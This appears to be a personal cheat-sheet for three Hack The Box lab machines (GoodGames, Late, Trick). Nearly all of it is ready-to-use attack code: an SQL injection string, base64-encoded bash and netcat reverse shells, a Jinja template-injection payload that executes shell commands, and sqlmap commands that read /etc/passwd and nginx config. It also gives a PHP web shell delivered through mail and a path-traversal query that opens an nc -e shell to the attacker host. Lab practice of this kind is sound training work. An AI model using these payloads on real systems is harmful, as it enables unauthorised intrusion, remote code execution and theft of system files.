# Hack The Box note

## GoodGames

```bash
# SQLi sample
# admin' or 1 = 1 -- -

# create base64 of reverse shell
echo -ne 'bash -i >& /dev/tcp/{host_ip}/4444 0>&1' | base64

# Python SSTI payload
# {{config.__class__.__init__.__globals__['os'].popen('echo${IFS}{preceeding_base64_string}${IFS}|base64${IFS}-d|bash').read()}}

# instead of netcat command
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/{target_ip}/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
```

## Late

```bash
# reverse shell sample

#!/bin/bash
rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/sh -i 2>&1|nc {host_ip} 1337 >/tmp/wk
```

```bash
# run server at current directory
python -m http.server 8000
```

## Trick

```bash
#
sqlmap -u {target_url} --data="username=abc&password=abc" -p username --batch
sqlmap -u {target_url} --data="username=abc&password=abc" -p username --level 5 --risk 3 --technique=BEUS --batch
sqlmap -u {target_url} --data="username=abc&password=abc" -p username --privileges
sqlmap -u {target_url} --data="username=abc&password=abc" -p username --batch --file-read=/etc/passwd
sqlmap -u {target_url} --data="username=abc&password=abc" -p username --batch --file-read=/etc/nginx/sitesenabled/default
```

```bash
# mail payload
<?php system($_GET['cmd']); ?>

# kick the mail script on mail dir
# this is query parameter
=....//....//....//....//....//....//var/mail/michael&cmd=nc%20{host_ip}%201337%20-e%20/bin/sh
```
